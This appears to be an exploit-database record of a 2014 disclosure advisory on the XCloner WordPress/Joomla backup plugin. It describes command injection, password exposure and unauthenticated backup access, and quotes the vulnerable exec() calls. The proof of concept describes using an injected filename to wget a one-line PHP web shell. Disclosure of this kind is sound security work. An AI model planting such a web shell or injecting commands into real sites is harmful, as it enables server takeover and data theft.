{
    "text": "ecve : CVE-2014-8607 CVE-2014-8606 CVE-2014-8605 CVE-2014-8604 CVE-2014-8603 ， title : WordPress Plugin / Joomla ! Component XCloner - Multiple Vulnerabilities - PHP webapps Exploit ， verified : Not Verified ， exploit_detail : Title : XCloner Wordpress/Joomla ! backup Plugin v3.1.1 ( Wordpress ) v3.5.1 ( Joomla !  ) Vulnerabilities ， Author : Larry W. Cashdollar ,  @ _larry0 ， Date : 10/17/2014 ， Download :  ， Download :  ， Downloads : Wordpress 313 , 647 Joomla ! 515745 StandAlone 69175 ， Website :  ， Advisory :  ， Vendor : Notified 10/17/14 Ovidiu Liuta ,  @ thinkovi Acknowledged & no other response. ， CVEID : Requested , TDB. ， OSVDBID : 114176 , 114177 , 114178 , 114179 , 114180 ， Description : XCloner is a Backup and Restore component designed for PHP/Mysql websites , it can work as a native plugin for WordPress and Joomla ! . ， Vulnerabilities : There are multiple vulnerabilities Ive discovered in this plugin , they are as follows. ， 1. Arbitrary command execution. ， 2. Clear text MySQL password exposure through html text box under configuration panel. ， 3. Database backups exposed to local users due to open file permissions. ， 4. Unauthenticated remote access to backup files via easily guessable file names. ， 5. Authenticated remote file access. ， 6. MySQL password exposed to process table. ， Arbitrary Command Execution ， Plugin allows arbitrary commands to be executed by an authenticated user. The user will require administrative access rights to backup the database. User input when specifying your own file name is not sanitized as well as various other input fields. ， PoC ， All input fields I believe are vulnerable , Ive chosen the backup filename and a wget of sh.txt which is simply <?php passthru (  $ _GET ) ?> into a writeable directory by www-data. ， Screenshots available at the advisory URL above. ， All user configurable variables are vulnerable , these variables need to be sanitized before being passed to the exec (  ) function for execution. ，  $ _CONFIG [ tarpath ]  ，  $ exclude ，  $ _CONFIG [ 'tarcompress' ]  ，  $ _CONFIG [ 'filename' ]  ，  $ _CONFIG [ 'exfile_tar' ]  ，  $ _CONFIG [ sqldump ]  ，  $ _CONFIG [ 'mysql_host' ]  ，  $ _CONFIG [ 'mysql_pass' ]  ，  $ _CONFIG [ 'mysql_user' ]  ，  $ database_name ，  $ sqlfile ，  $ filename ， Vulnerable code ， ./cloner.functions.php :  ， 1672 exec (  $ _CONFIG [ tarpath ] . \" $ exclude -c\" . $ _CONFIG [ 'tarcompress' ] . \"vf $ filename ./administrator/backups/index.html\" )  ;  ， 1673 exec (  $ _CONFIG [ tarpath ] . \" -\" . $ _CONFIG [ 'tarcompress' ] . \"vf $ filename -update ./administrator/backups/database-sql.sql\" )  ;  ， 1674 exec (  $ _CONFIG [ tarpath ] . \" -\" . $ _CONFIG [ 'tarcompress' ] . \"vf $ filename -update ./administrator/backups/htaccess.txt\" )  ;  ， 1675 exec (  $ _CONFIG [ tarpath ] . \" -\" . $ _CONFIG [ 'tarcompress' ] . \"vf $ filename -update ./administrator/backups/perm.txt\" )  ;  ， 1695- if (  $ _REQUEST [ cron_dbonly ]  ! = 1 ) { ， 1696 : exec (  $ _CONFIG [ tarpath ] . \" $ excl_cmd \" . \" -X \" . $ _CONFIG [ 'exfile_tar' ] . \" -chv\" . $ _CONFIG [ 'tarcompress' ] . \"f $ filename ./\" )  ;  ， 1697- } else { ， 1698- ， 1699- ， 1700 : exec (  $ _CONFIG [ tarpath ] . \" -\" . $ _CONFIG [ 'tarcompress' ] . \"cvf $ filename ./administrator/backups/database-sql.sql\" )  ;  ， 1701- ， 1702- if ( is_array (  $ databases_incl )  ) { ， 1703- foreach (  $ databases_incl as $ database_name )  ， 1704- if (  $ database_name ! = \"\" ) { ， 1705 : exec (  $ _CONFIG [ tarpath ] . \" -\" . $ _CONFIG [ 'tarcompress' ] . \"vf $ filename -update ./administrator/backups/\" . $ database_name . \"-sql.sql\" )  ;  ， 1706- } ， 1707- } ， 1708- } ， 1873- { ， 1874- // $ sizeInBytes = filesize (  $ path )  ;  ， 1875- $ sizeInBytes = s",
    "time": "2014-11-10"
}